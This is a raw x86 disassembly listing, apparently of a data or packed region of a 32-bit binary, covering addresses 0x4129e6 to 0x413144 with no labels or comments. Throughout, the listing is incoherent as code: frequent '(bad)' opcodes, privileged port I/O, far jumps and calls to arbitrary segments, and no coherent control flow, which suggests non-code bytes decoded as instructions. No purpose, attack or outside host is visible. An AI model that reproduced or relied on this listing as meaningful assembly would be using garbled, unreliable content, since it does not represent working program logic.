  4129e6:	adc    eax,0x23a192ed
  4129eb:	aad    0x10
  4129ed:	(bad)  
  4129ee:	lea    ecx,[eax-0x22e47bec]
  4129f4:	adc    eax,0xadbfccd9
  4129f9:	push   0xffffff91
  4129fb:	shr    ebx,0xc2
  4129fe:	inc    esi
  4129ff:	mov    ch,0xf8
  412a01:	pop    ds
  412a02:	aas    
  412a03:	imul   ecx,DWORD PTR [ebp+0x34a44112],0x75
  412a0a:	mov    bh,0xf7
  412a0c:	hlt    
  412a0d:	jmp    0x358b9a02
  412a12:	cmp    al,0x9d
  412a14:	mov    esi,0x42135469
  412a19:	xor    DWORD PTR [esi-0x3dc500f],eax
  412a1f:	jmp    0x82df1ce3
  412a24:	sbb    bh,BYTE PTR [edi]
  412a26:	imul   eax,DWORD PTR [ebp-0x1620f111],0x3534105a
  412a30:	inc    esp
  412a31:	or     BYTE PTR [ebx-0x303d0943],bl
  412a37:	mov    bh,0xed
  412a39:	and    esi,DWORD PTR [ebx-0x7b]
  412a3c:	inc    esi
  412a3d:	stos   BYTE PTR es:[edi],al
  412a3e:	or     DWORD PTR [edi+0x52f237da],edx
  412a44:	ja     0x412a4c
  412a46:	cmp    cl,BYTE PTR ds:0x28129cd5
  412a4c:	ja     0x412ab1
  412a4e:	xchg   ebp,eax
  412a4f:	dec    ecx
  412a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a51:	cmp    DWORD PTR [esi+0x23c7bcc4],ecx
  412a57:	mov    ebx,0xc6417cbb
  412a5c:	mov    ecx,esi
  412a5e:	mov    al,0x63
  412a60:	es loop 0x412a2f
  412a63:	cld    
  412a64:	xchg   esi,eax
  412a65:	pop    ebx
  412a66:	imul   eax,DWORD PTR [edi+ecx*8+0x37],0xffffffbe
  412a6b:	add    eax,0x229e62b4
  412a70:	push   cs
  412a71:	stos   BYTE PTR es:[edi],al
  412a72:	cmp    eax,0x68f4b3be
  412a77:	call   0xbed1e989
  412a7c:	adc    BYTE PTR [eax-0x24],0xdf
  412a80:	(bad)  
  412a81:	ss mov dh,0xb6
  412a84:	pop    edx
  412a85:	clc    
  412a86:	sbb    DWORD PTR [ebx+eax*1+0x19],esi
  412a8a:	mov    ch,0x30
  412a8c:	fwait
  412a8d:	cdq    
  412a8e:	push   edi
  412a8f:	push   ss
  412a90:	nop
  412a91:	rcr    BYTE PTR [esi],1
  412a93:	stc    
  412a94:	or     eax,0x8ad58604
  412a99:	mov    DWORD PTR [ecx-0x1c7f4834],0x78a40f01
  412aa3:	fisubr WORD PTR [edi+esi*1]
  412aa6:	inc    eax
  412aa7:	cmp    ch,BYTE PTR [edx]
  412aa9:	in     eax,0x61
  412aab:	repz imul edi,DWORD PTR [ecx],0xffffffe7
  412aaf:	pop    eax
  412ab0:	xlat   BYTE PTR ds:[ebx]
  412ab1:	xor    BYTE PTR [esi+0x3a],ah
  412ab4:	icebp  
  412ab5:	pop    ss
  412ab6:	neg    DWORD PTR [esi-0x41]
  412ab9:	or     edi,edi
  412abb:	test   BYTE PTR [ebx+0x70],dh
  412abe:	and    dh,BYTE PTR [edi-0x21]
  412ac1:	fs (bad) 
  412ac3:	(bad)  
  412ac4:	in     al,dx
  412ac5:	retf   
  412ac6:	or     DWORD PTR [edi+ecx*1+0x765c9606],esp
  412acd:	aas    
  412ace:	mov    bl,0xb2
  412ad0:	loop   0x412a7a
  412ad2:	xor    eax,0x71056b5c
  412ad7:	adc    eax,0xe963b10d
  412adc:	push   ecx
  412add:	shl    BYTE PTR [ebp-0x4e],0x89
  412ae1:	pusha  
  412ae2:	ret    
  412ae3:	outs   dx,BYTE PTR ds:[esi]
  412ae4:	pop    ebp
  412ae5:	retf   
  412ae6:	scas   al,BYTE PTR es:[edi]
  412ae7:	jge    0x412ab2
  412ae9:	test   DWORD PTR [ebx-0xa],edx
  412aec:	ds cli 
  412aee:	xchg   BYTE PTR [esi],bl
  412af0:	mov    ss,WORD PTR [eax]
  412af2:	push   esi
  412af3:	int3   
  412af4:	rol    DWORD PTR [ebp-0x20],cl
  412af7:	mov    ds,WORD PTR [ebp-0x76]
  412afa:	je     0x412b11
  412afc:	mov    esi,esi
  412afe:	or     BYTE PTR [edx-0x56e8073b],dh
  412b04:	scas   al,BYTE PTR es:[edi]
  412b05:	ss popf 
  412b07:	add    al,0xed
  412b09:	lods   eax,DWORD PTR ds:[esi]
  412b0a:	and    DWORD PTR [ecx],edx
  412b0c:	dec    edx
  412b0d:	leave  
  412b0e:	ficomp DWORD PTR [edi+eax*8]
  412b11:	mov    dl,0x7a
  412b13:	jmp    0xbff5:0xb62174c7
  412b1a:	and    ebx,edi
  412b1c:	rol    BYTE PTR [edi+0x13],1
  412b1f:	adc    ecx,DWORD PTR [ebp-0x992e61a]
  412b25:	pop    ecx
  412b26:	cdq    
  412b27:	xchg   edx,eax
  412b28:	leave  
  412b29:	adc    al,0xa0
  412b2b:	pop    eax
  412b2c:	in     eax,dx
  412b2d:	daa    
  412b2e:	and    eax,0x72e2a410
  412b33:	ss inc esp
  412b35:	pop    ebp
  412b36:	ds and esp,esi
  412b39:	push   DWORD PTR [ecx]
  412b3b:	xchg   ebp,eax
  412b3c:	push   es
  412b3d:	push   cs
  412b3e:	xchg   BYTE PTR [ebx+0x5a6e3551],ah
  412b44:	fimul  WORD PTR [ebp+0x390df605]
  412b4a:	repnz xchg edx,eax
  412b4c:	addr16 xchg ebp,eax
  412b4e:	push   ecx
  412b4f:	dec    ebp
  412b50:	jnp    0x412b2e
  412b52:	dec    eax
  412b53:	iret   
  412b54:	jno    0x412bd2
  412b56:	lock je 0x412b6a
  412b59:	and    al,0x6c
  412b5b:	sub    ch,ah
  412b5d:	push   0x73
  412b5f:	gs push esp
  412b61:	push   ebp
  412b62:	push   ds
  412b63:	add    eax,DWORD PTR [eax-0x69]
  412b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b67:	icebp  
  412b68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b69:	icebp  
  412b6a:	fiadd  DWORD PTR [eax+0x54]
  412b6d:	cmp    BYTE PTR [eax],bl
  412b6f:	stc    
  412b70:	adc    eax,DWORD PTR [ebx]
  412b72:	sub    DWORD PTR [edx+ebx*1],ebp
  412b75:	ja     0x412ba3
  412b77:	repz fidivr DWORD PTR [ecx-0x7e]
  412b7b:	test   DWORD PTR [ecx],eax
  412b7d:	mov    BYTE PTR [eax+0x5c],al
  412b80:	jne    0x412bec
  412b82:	cs scas al,BYTE PTR es:[edi]
  412b84:	jmp    0xec385cf8
  412b89:	adc    dl,cl
  412b8b:	sbb    ecx,DWORD PTR [esi+0x39c25775]
  412b91:	rcr    BYTE PTR [eax+0x7aad4d0f],0x47
  412b98:	lea    esp,[edi+0x5558931a]
  412b9e:	loopne 0x412be6
  412ba0:	int3   
  412ba1:	imul   ebp,DWORD PTR [esi+0xc514b03],0xffffffa8
  412ba8:	(bad)  
  412ba9:	and    DWORD PTR [edx+0x1ac63578],ebp
  412baf:	cld    
  412bb0:	ret    0x822b
  412bb3:	repz adc BYTE PTR [esi+0x4c],dh
  412bb7:	loope  0x412c24
  412bb9:	cmp    DWORD PTR [edx-0x621ad0cc],edi
  412bbf:	iret   
  412bc0:	mov    ch,0xb5
  412bc2:	test   al,0xe0
  412bc4:	or     DWORD PTR [edi-0x61],ecx
  412bc7:	sub    dl,BYTE PTR [eax-0x1f]
  412bca:	xor    eax,0x52302552
  412bcf:	cmp    BYTE PTR [edi+0x2a],cl
  412bd2:	xchg   ebx,eax
  412bd3:	add    cl,al
  412bd5:	mov    bh,0xb1
  412bd7:	inc    ebp
  412bd8:	repz cmp BYTE PTR [eiz*8+0x77fa431c],dl
  412be0:	sbb    bl,BYTE PTR [eax-0x48]
  412be3:	mov    ch,0x78
  412be5:	cmp    al,0xfc
  412be7:	aaa    
  412be8:	mov    al,ds:0x67569a02
  412bed:	xchg   ecx,eax
  412bee:	pop    edi
  412bef:	jge    0x412bee
  412bf1:	dec    esi
  412bf2:	mov    ebp,0xe994ebcf
  412bf7:	adc    BYTE PTR [ebp-0x363883c3],ah
  412bfd:	call   0xdda9:0xdb3450a0
  412c04:	test   DWORD PTR [ebx+esi*1+0x4f],0xb99ab08
  412c0c:	loopne 0x412c1e
  412c0e:	push   ebp
  412c0f:	pop    edx
  412c10:	push   dx
  412c12:	cmp    al,0x90
  412c14:	repnz test BYTE PTR [edi],dl
  412c17:	sbb    BYTE PTR [eax+0x199bfeec],cl
  412c1d:	pop    edi
  412c1e:	lea    ebp,[esp+ebx*2+0x167d99e8]
  412c25:	cmp    dl,BYTE PTR [esi]
  412c27:	ret    0x960d
  412c2a:	clc    
  412c2b:	lock xor edx,DWORD PTR [ecx]
  412c2e:	fcomp  st(4)
  412c30:	dec    eax
  412c31:	inc    esp
  412c32:	mov    esi,0x42c91cea
  412c37:	fwait
  412c38:	or     eax,0x92580a3f
  412c3d:	(bad)  
  412c3f:	xor    al,0x0
  412c41:	stos   BYTE PTR es:[edi],al
  412c42:	cld    
  412c43:	dec    esp
  412c44:	cwde   
  412c45:	rcl    DWORD PTR [esi+edx*1],1
  412c48:	cmp    al,0xd0
  412c4a:	fisub  WORD PTR [ecx-0x45]
  412c4d:	sub    eax,0x553cb612
  412c52:	ror    DWORD PTR [esi+0x79],1
  412c55:	and    BYTE PTR [ebx+0x51f9fca2],dl
  412c5b:	or     DWORD PTR [ebx],ecx
  412c5d:	and    dh,bl
  412c5f:	stos   BYTE PTR es:[edi],al
  412c60:	sub    BYTE PTR [eax],dl
  412c62:	lds    edi,FWORD PTR [esp+esi*4+0x21328cf2]
  412c69:	mov    al,0x5d
  412c6b:	push   eax
  412c6c:	and    BYTE PTR [edi],ch
  412c6e:	into   
  412c6f:	mov    ?,esp
  412c71:	adc    eax,0xeedb906c
  412c76:	(bad)  
  412c77:	jb     0x412c7a
  412c79:	sub    eax,DWORD PTR [ecx+0x7ce31a36]
  412c7f:	retf   0xb03e
  412c82:	inc    ebx
  412c83:	cld    
  412c84:	mov    ebx,0xbfa5fbd6
  412c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c8a:	pop    ebp
  412c8b:	sub    ebp,eax
  412c8d:	loop   0x412cd8
  412c8f:	push   esp
  412c90:	push   eax
  412c91:	push   ebp
  412c92:	jp     0x412d11
  412c94:	mov    gs,WORD PTR [esi-0x7e]
  412c97:	mov    ch,0xc5
  412c99:	loopne 0x412d04
  412c9b:	inc    esp
  412c9c:	ja     0x412c37
  412c9e:	and    al,0x68
  412ca0:	sti    
  412ca1:	mov    cs,WORD PTR [eax-0x52592383]
  412ca7:	mov    bl,0x64
  412ca9:	inc    ebp
  412caa:	push   0xc320f1b5
  412caf:	dec    edx
  412cb0:	into   
  412cb1:	fsub   QWORD PTR [eax]
  412cb3:	ficomp WORD PTR [ebx]
  412cb5:	fdiv   QWORD PTR [ebx]
  412cb7:	sub    al,dh
  412cb9:	adc    al,0xe5
  412cbb:	dec    edi
  412cbc:	pop    ss
  412cbd:	neg    DWORD PTR [esi]
  412cbf:	ficom  DWORD PTR [edi-0x3dab1fbe]
  412cc5:	retf   
  412cc6:	arpl   WORD PTR [edi-0x26f40b20],di
  412ccc:	push   0x70c4c9ff
  412cd1:	mov    dh,BYTE PTR [esi-0x6d]
  412cd4:	or     eax,0x6b2fe106
  412cd9:	inc    edx
  412cda:	mov    eax,ds:0x9e7f597d
  412cdf:	pop    ebx
  412ce0:	cmp    eax,0xb414c711
  412ce5:	mov    ebp,ebx
  412ce7:	adc    esi,DWORD PTR [ebx]
  412ce9:	(bad)  
  412cea:	pop    ebp
  412ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cec:	cs loope 0x412d0a
  412cef:	inc    edi
  412cf0:	mov    ss,WORD PTR [edi+0x77fbe1a1]
  412cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cf7:	inc    eax
  412cf8:	inc    ebp
  412cf9:	lods   al,BYTE PTR ds:[esi]
  412cfa:	jbe    0x412d0e
  412cfc:	dec    ebp
  412cfd:	(bad)  
  412cfe:	das    
  412cff:	sbb    DWORD PTR [ebp-0x8e945cb],edi
  412d05:	repnz xor ebp,edx
  412d08:	dec    esp
  412d09:	(bad)  
  412d0a:	mov    al,0xad
  412d0c:	jnp    0x412cf2
  412d0e:	shl    BYTE PTR [ecx],cl
  412d10:	in     al,0x4f
  412d12:	repnz xchg esp,eax
  412d14:	sbb    ah,cl
  412d16:	push   es
  412d17:	stc    
  412d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d19:	scas   eax,DWORD PTR es:[edi]
  412d1a:	leave  
  412d1b:	push   ebx
  412d1c:	lods   eax,DWORD PTR ds:[esi]
  412d1d:	mov    ebx,DWORD PTR [eax-0xee38875]
  412d23:	sbb    al,0x4d
  412d25:	fiadd  DWORD PTR [ebp-0x7c0d8d87]
  412d2b:	stos   BYTE PTR es:[edi],al
  412d2c:	sbb    ah,BYTE PTR [esi-0x6f]
  412d2f:	xchg   ebx,eax
  412d30:	or     BYTE PTR [edi-0x20],cl
  412d33:	jae    0x412d1d
  412d35:	clc    
  412d36:	(bad)
  412d39:	call   0xc1459c62
  412d3e:	pop    ss
  412d3f:	fadd   DWORD PTR [edi-0x27]
  412d42:	mov    edx,0xd477e6e6
  412d47:	sub    al,cl
  412d49:	dec    ecx
  412d4a:	jb     0x412d93
  412d4c:	xchg   edi,eax
  412d4d:	xchg   BYTE PTR [ecx+0x6a],dl
  412d50:	adc    dl,BYTE PTR [edi-0x19]
  412d53:	setge  BYTE PTR [ecx+edx*1+0xd]
  412d58:	add    al,0x2b
  412d5a:	jne    0x412d35
  412d5c:	fs out dx,al
  412d5e:	out    dx,eax
  412d5f:	ins    BYTE PTR es:[edi],dx
  412d60:	push   0xffffff9d
  412d62:	cmp    eax,DWORD PTR [esi+0x3ae508fb]
  412d68:	inc    ebp
  412d69:	jno    0x412d18
  412d6b:	pushf  
  412d6c:	ror    DWORD PTR [edi],1
  412d6e:	xor    ebp,DWORD PTR [edx+0x73]
  412d71:	clc    
  412d72:	jl     0x412d61
  412d74:	pop    es
  412d75:	or     al,0xd9
  412d77:	mov    ah,0x7b
  412d79:	cld    
  412d7a:	sub    cl,BYTE PTR [eax-0x6b]
  412d7d:	jp     0x412dac
  412d7f:	pop    ebx
  412d80:	inc    ecx
  412d81:	pop    ds
  412d82:	jmp    0x447:0x84586c47
  412d89:	sub    bh,BYTE PTR [esi-0xfe0b341]
  412d8f:	test   ebp,edx
  412d91:	mov    dl,BYTE PTR [eax-0x5b]
  412d94:	mov    ch,0x3e
  412d96:	fwait
  412d97:	cmc    
  412d98:	int    0xf8
  412d9a:	push   ss
  412d9b:	(bad)  
  412d9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d9d:	dec    esp
  412d9e:	loopne 0x412dd4
  412da0:	fs jae 0x412e1b
  412da3:	inc    ecx
  412da4:	leave  
  412da5:	call   0xb580:0x4a625de9
  412dac:	in     al,0x53
  412dae:	lea    eax,[edi+0x53]
  412db1:	jecxz  0x412d4a
  412db3:	xor    DWORD PTR [ecx+0x6d],edx
  412db6:	sti    
  412db7:	pop    esp
  412db8:	push   edi
  412db9:	fistp  WORD PTR [ebp+0x6b]
  412dbc:	addr16 dec edi
  412dbe:	out    dx,eax
  412dbf:	jmp    0x9e399b27
  412dc4:	rcl    DWORD PTR [edx-0x4cde6e5],1
  412dca:	hlt    
  412dcb:	add    esp,DWORD PTR [esi-0x59dce2df]
  412dd1:	shl    edx,cl
  412dd3:	add    al,0x7f
  412dd5:	call   0x5b78:0x358b4e17
  412ddc:	clc    
  412ddd:	pop    ebx
  412dde:	in     eax,dx
  412ddf:	pop    ecx
  412de0:	cmp    ecx,DWORD PTR [eax+esi*4]
  412de3:	or     dh,bl
  412de5:	adc    ebx,esi
  412de7:	jle    0x412dc3
  412de9:	ins    DWORD PTR es:[edi],dx
  412dea:	cwde   
  412deb:	ja     0x412e09
  412ded:	push   ds
  412dee:	aam    0xa6
  412df0:	cmp    al,0x12
  412df2:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412df4:	fild   DWORD PTR ds:0x1298f6de
  412dfa:	out    dx,al
  412dfb:	pushf  
  412dfc:	sbb    DWORD PTR [edx],0x9413ae36
  412e02:	enter  0xace3,0xba
  412e06:	stc    
  412e07:	cli    
  412e08:	push   ebx
  412e09:	mov    fs,WORD PTR [esp+ecx*8+0x6]
  412e0d:	xlat   BYTE PTR ds:[ebx]
  412e0e:	push   edx
  412e0f:	lds    esp,FWORD PTR [esi+0x5f]
  412e12:	adc    ecx,esp
  412e14:	sbb    BYTE PTR [ebp+0x6e],dl
  412e17:	inc    ebp
  412e18:	push   ebp
  412e19:	iret   
  412e1a:	pop    ss
  412e1b:	loopne 0x412db4
  412e1d:	pop    eax
  412e1e:	popf   
  412e1f:	pop    edi
  412e20:	jg     0x412e0d
  412e22:	gs xchg ebp,esp
  412e25:	jmp    0x8e1469fc
  412e2a:	test   BYTE PTR [ebp+ecx*4-0x4227e67e],0x8
  412e32:	imul   ecx,DWORD PTR [esi+0x45],0xffffffce
  412e36:	cld    
  412e37:	seta   BYTE PTR [ebx-0x59]
  412e3b:	loop   0x412e85
  412e3d:	fisubr DWORD PTR [ebx]
  412e3f:	pop    ebx
  412e40:	pop    edi
  412e41:	mov    BYTE PTR [edx-0xe],cl
  412e44:	xor    BYTE PTR [edi+0x10],bl
  412e47:	test   eax,0x1a1e26ad
  412e4c:	in     al,dx
  412e4d:	pop    edx
  412e4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e4f:	outs   dx,DWORD PTR ds:[esi]
  412e50:	jp     0x412de5
  412e52:	xchg   DWORD PTR [edi+0x383404c1],eax
  412e58:	push   ss
  412e59:	inc    edi
  412e5a:	shrd   DWORD PTR [esi+0xa77ccfe],ebp,0x88
  412e62:	sub    al,0xc6
  412e64:	xor    esp,esi
  412e66:	(bad)  
  412e67:	bound  esp,QWORD PTR [eax+0xd52c5ed]
  412e6d:	addr16 cmc 
  412e6f:	jg     0x412e75
  412e71:	xor    eax,0xe16686c0
  412e76:	sub    eax,DWORD PTR [edx]
  412e78:	jle    0x412e36
  412e7a:	outs   dx,BYTE PTR ds:[esi]
  412e7b:	outs   dx,DWORD PTR ds:[esi]
  412e7c:	dec    ebx
  412e7d:	push   edx
  412e7e:	dec    ebx
  412e7f:	inc    eax
  412e80:	dec    ecx
  412e81:	aad    0x7e
  412e83:	pushf  
  412e84:	dec    edi
  412e85:	fisubr WORD PTR [eax+0x735ee6d9]
  412e8b:	mov    WORD PTR [edx+0x60a4b1ed],es
  412e91:	inc    edi
  412e92:	gs pop esi
  412e94:	mov    esp,0x3209f9d7
  412e99:	data16 jl 0x412e40
  412e9c:	xchg   edx,eax
  412e9d:	sahf   
  412e9e:	icebp  
  412e9f:	(bad)  
  412ea0:	in     eax,dx
  412ea1:	shl    DWORD PTR [edi],cl
  412ea3:	mov    ch,0x1e
  412ea5:	jle    0x412e29
  412ea7:	leave  
  412ea8:	leave  
  412ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eaa:	dec    esi
  412eab:	sub    ch,BYTE PTR [edi+0x68]
  412eae:	clc    
  412eaf:	xor    BYTE PTR [esi+0x6fc92f4],ah
  412eb5:	loope  0x412efa
  412eb7:	sub    dl,ch
  412eb9:	xchg   BYTE PTR [esi-0x6c217a67],dl
  412ebf:	icebp  
  412ec0:	fistp  WORD PTR [edi]
  412ec2:	in     al,dx
  412ec3:	test   BYTE PTR [edx+edx*2+0x5d],dl
  412ec7:	xchg   ecx,eax
  412ec8:	scas   al,BYTE PTR es:[edi]
  412ec9:	jns    0x412e77
  412ecb:	or     edx,eax
  412ecd:	mov    eax,0xb2b3e4c4
  412ed2:	fnsave [ecx]
  412ed4:	add    eax,0x4f21ec4f
  412ed9:	(bad)  
  412eda:	xchg   ebx,eax
  412edb:	push   ds
  412edc:	scas   eax,DWORD PTR es:[edi]
  412edd:	or     al,0xe
  412edf:	add    bh,BYTE PTR [edx+0x2b]
  412ee2:	pop    ebx
  412ee3:	imul   dl
  412ee5:	sbb    al,0xa1
  412ee7:	mov    dl,0xca
  412ee9:	push   edi
  412eea:	into   
  412eeb:	sub    ah,BYTE PTR [ebx-0x36]
  412eee:	mov    eax,ds:0x54ac0820
  412ef3:	add    eax,0x4643abe8
  412ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ef9:	sub    BYTE PTR gs:[esi+0x17],bh
  412efd:	push   cs
  412efe:	mov    ebp,0xfb71d63b
  412f03:	fsub   QWORD PTR [edi+edx*8+0x1cba9eea]
  412f0a:	(bad)  
  412f0b:	sub    eax,0x8cb48425
  412f10:	sbb    al,0x27
  412f12:	ret    0x617f
  412f15:	sub    DWORD PTR [edx],ecx
  412f17:	jp     0x412f8a
  412f19:	leave  
  412f1a:	mov    ch,0x7b
  412f1c:	push   es
  412f1d:	sbb    DWORD PTR [esi],edx
  412f1f:	pop    eax
  412f20:	jo     0x412f8c
  412f22:	xor    DWORD PTR [eax+0x6],esp
  412f25:	std    
  412f26:	or     al,0x58
  412f28:	unpcklps xmm1,xmm0
  412f2b:	and    ch,BYTE PTR [esi]
  412f2d:	scas   al,BYTE PTR es:[edi]
  412f2e:	and    bl,BYTE PTR [edx-0x5e]
  412f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f32:	nop
  412f33:	mov    bh,BYTE PTR [eax+0x62904c18]
  412f39:	or     eax,0x7cc6b409
  412f3e:	push   esp
  412f3f:	fidivr WORD PTR [ebx+0x76f77b83]
  412f45:	or     al,0xa5
  412f47:	ds sbb bh,cl
  412f4a:	xor    al,bl
  412f4c:	push   es
  412f4d:	adc    eax,0x60d9ff87
  412f52:	add    bl,BYTE PTR [edx+0x3a]
  412f55:	xchg   esi,eax
  412f56:	arpl   WORD PTR [ecx-0x45],si
  412f59:	mov    cl,0x46
  412f5b:	addr16 hlt 
  412f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f5e:	adc    eax,0x6bdf449f
  412f63:	adc    ebx,DWORD PTR [ebx+0x2]
  412f66:	fwait
  412f67:	jl     0x412f1a
  412f69:	pop    cx
  412f6b:	loopne 0x412f6e
  412f6d:	lahf   
  412f6e:	lahf   
  412f6f:	or     BYTE PTR [ebx+edi*1+0x4d],0x65
  412f74:	mov    edi,0x6fb0657
  412f79:	cdq    
  412f7a:	mov    eax,ds:0xefaf5f45
  412f7f:	imul   ecx,DWORD PTR [ecx+0x1e31bd59],0xffffffff
  412f86:	sbb    ecx,DWORD PTR ds:0x955dc47c
  412f8c:	or     BYTE PTR [edi+edi*8-0x5e],bh
  412f90:	cmp    dl,dl
  412f92:	daa    
  412f93:	lahf   
  412f94:	shl    BYTE PTR [esi],cl
  412f96:	add    ch,ah
  412f98:	fnsave [ebp-0x4f07897e]
  412f9e:	fiadd  DWORD PTR [esi-0x42]
  412fa1:	iret   
  412fa2:	jle    0x412f5e
  412fa4:	les    esi,FWORD PTR fs:[edi+0x6e]
  412fa8:	jo     0x412f66
  412faa:	pop    eax
  412fab:	es in  eax,0xc9
  412fae:	inc    esi
  412faf:	imul   dl
  412fb1:	sbb    eax,0xc2ad1c4a
  412fb6:	mov    ah,0xef
  412fb8:	or     ch,BYTE PTR [ecx+eiz*1]
  412fbb:	inc    ebx
  412fbc:	cmp    esi,DWORD PTR [edi+ecx*8+0x4e737f9b]
  412fc3:	dec    esi
  412fc4:	pop    edi
  412fc5:	push   cs
  412fc6:	pop    esi
  412fc7:	fs loop 0x412fc9
  412fca:	mov    ch,0xe
  412fcc:	popa   
  412fcd:	in     al,0x77
  412fcf:	add    edi,DWORD PTR [edx-0x701357fb]
  412fd5:	fdiv   QWORD PTR [esi-0x222c65dd]
  412fdb:	pop    ebp
  412fdc:	sbb    BYTE PTR [ebp-0x279dfc87],bh
  412fe2:	rol    BYTE PTR [ebx],1
  412fe4:	push   ebx
  412fe5:	push   esp
  412fe6:	bound  ebp,QWORD PTR [esi+0x61]
  412fe9:	pop    edx
  412fea:	ret    0xfd32
  412fed:	dec    esi
  412fee:	jecxz  0x412fb2
  412ff0:	cli    
  412ff1:	adc    ah,BYTE PTR [edx+ebp*2]
  412ff4:	ffreep st(0)
  412ff6:	lahf   
  412ff7:	adc    bh,BYTE PTR [eax+ecx*8-0x68a7dc2a]
  412ffe:	mov    edx,0x95b8a961
  413003:	cmp    edx,edi
  413005:	test   DWORD PTR [eax+0x5a214a54],edi
  41300b:	stos   BYTE PTR es:[edi],al
  41300c:	mov    eax,ds:0x42640e01
  413011:	dec    ebx
  413012:	clc    
  413013:	inc    edx
  413014:	dec    ebx
  413015:	xor    ebx,esi
  413017:	pop    es
  413018:	es adc cl,cl
  41301b:	inc    ecx
  41301c:	aaa    
  41301d:	das    
  41301e:	pop    ecx
  41301f:	es add al,0xd9
  413022:	push   es
  413023:	jae    0x412fb2
  413025:	inc    ebp
  413026:	mov    cl,BYTE PTR [edi]
  413028:	cwde   
  413029:	or     BYTE PTR [ebp+0x15],bh
  41302c:	aaa    
  41302d:	inc    esi
  41302e:	inc    esi
  41302f:	rcl    al,1
  413031:	sub    BYTE PTR [ebx+edi*2-0x3ea7efde],cl
  413038:	add    eax,DWORD PTR [eax]
  41303a:	icebp  
  41303b:	es call 0x6a07:0x98a9fab7
  413043:	scas   al,BYTE PTR es:[edi]
  413044:	shr    al,cl
  413046:	sub    BYTE PTR [edi],0x58
  413049:	jnp    0x41309d
  41304b:	mov    dh,0x35
  41304d:	mov    dh,0xd2
  41304f:	scas   al,BYTE PTR es:[edi]
  413050:	adc    bl,BYTE PTR [edx]
  413052:	(bad)  
  413054:	add    al,0xcc
  413056:	or     al,0x5c
  413058:	or     DWORD PTR [esi*4+0x599dd121],edi
  41305f:	push   esi
  413060:	add    BYTE PTR [ebp-0x5e532cbe],ah
  413066:	(bad)  
  413067:	push   ebx
  413068:	idiv   BYTE PTR [ebx+0x21]
  41306b:	sbb    BYTE PTR [edx],0x22
  41306e:	sbb    DWORD PTR [ebp+0x42],ecx
  413071:	adc    edx,DWORD PTR [eax-0x3f]
  413074:	mov    ebp,DWORD PTR [ebx]
  413076:	add    esp,DWORD PTR [edi-0x288d167c]
  41307c:	fcom   DWORD PTR [eax]
  41307e:	dec    esi
  41307f:	cld    
  413080:	pop    esi
  413081:	fwait
  413082:	pop    es
  413083:	pxor   mm2,QWORD PTR [ebp+ecx*1-0x59]
  413088:	push   0x205dd80b
  41308d:	xchg   edi,eax
  41308e:	sbb    eax,0x91ed9a04
  413093:	test   al,0x6f
  413095:	fs test al,0x5
  413098:	pop    ecx
  413099:	and    edi,ebx
  41309b:	sub    ebp,DWORD PTR [eax+ebp*1]
  41309e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41309f:	xchg   esp,eax
  4130a0:	mov    ecx,DWORD PTR [eax]
  4130a2:	and    esp,0x77f382d2
  4130a8:	or     DWORD PTR [edi-0x38],ecx
  4130ab:	xchg   esp,eax
  4130ac:	lods   al,BYTE PTR ds:[esi]
  4130ad:	ret    
  4130ae:	js     0x41311c
  4130b0:	push   ecx
  4130b1:	cdq    
  4130b2:	ficomp WORD PTR [eax]
  4130b4:	inc    edi
  4130b5:	jmp    FWORD PTR [edi+0x68fb398f]
  4130bb:	inc    ecx
  4130bc:	(bad)  
  4130bd:	mov    ch,0x7e
  4130bf:	call   0xb40d:0xe97f3388
  4130c6:	out    0x20,eax
  4130c8:	and    eax,0x8c91ac99
  4130cd:	push   esi
  4130ce:	aas    
  4130cf:	or     ah,0x41
  4130d2:	push   ebx
  4130d3:	mov    edx,0x759e799c
  4130d8:	mov    al,ds:0x5e8bb861
  4130dd:	mov    bh,0x9b
  4130df:	sub    edi,esp
  4130e1:	jb     0x41308f
  4130e3:	aad    0x66
  4130e5:	fsubr  QWORD PTR [ebx]
  4130e7:	inc    ebx
  4130e8:	xchg   esi,eax
  4130e9:	push   es
  4130ea:	addr16 sbb eax,0x81b942ec
  4130f0:	inc    ebx
  4130f1:	nop
  4130f2:	lods   al,BYTE PTR ds:[esi]
  4130f3:	add    ecx,DWORD PTR [ecx]
  4130f5:	(bad)  
  4130f6:	sti    
  4130f7:	push   ds
  4130f8:	pop    esp
  4130f9:	pop    eax
  4130fa:	out    dx,eax
  4130fb:	(bad)  
  4130fc:	xchg   esp,eax
  4130fd:	pop    edi
  4130fe:	sti    
  4130ff:	lea    ebx,[edx]
  413101:	inc    ebp
  413102:	add    edi,DWORD PTR [ebx+0x1e]
  413105:	sbb    eax,0x6fd3eba9
  41310a:	aas    
  41310b:	adc    ah,BYTE PTR [ebx-0x5b1e2428]
  413111:	adc    al,BYTE PTR [esi]
  413113:	fdiv   DWORD PTR [ecx]
  413115:	xchg   ecx,eax
  413116:	neg    BYTE PTR [ecx-0x10]
  413119:	and    eax,0x7ec4053f
  41311e:	ins    DWORD PTR es:[edi],dx
  41311f:	fisubr DWORD PTR [ebx]
  413121:	push   esi
  413122:	sbb    edx,DWORD PTR [edi]
  413124:	out    dx,eax
  413125:	pop    edi
  413126:	jp     0x4130a8
  413128:	fsubr  DWORD PTR [esi]
  41312a:	mov    eax,ds:0xdebba353
  41312f:	clc    
  413130:	loopne 0x4130de
  413132:	push   edx
  413133:	push   esi
  413134:	stos   BYTE PTR es:[edi],al
  413135:	sbb    BYTE PTR [ebx-0x2095f41c],ah
  41313b:	(bad)  
  41313c:	out    0x2f,eax
  41313e:	add    ecx,DWORD PTR [edx+eax*1-0x7a]
  413142:	xor    bh,BYTE PTR [edx]
  413144:	jb     0x4130dc
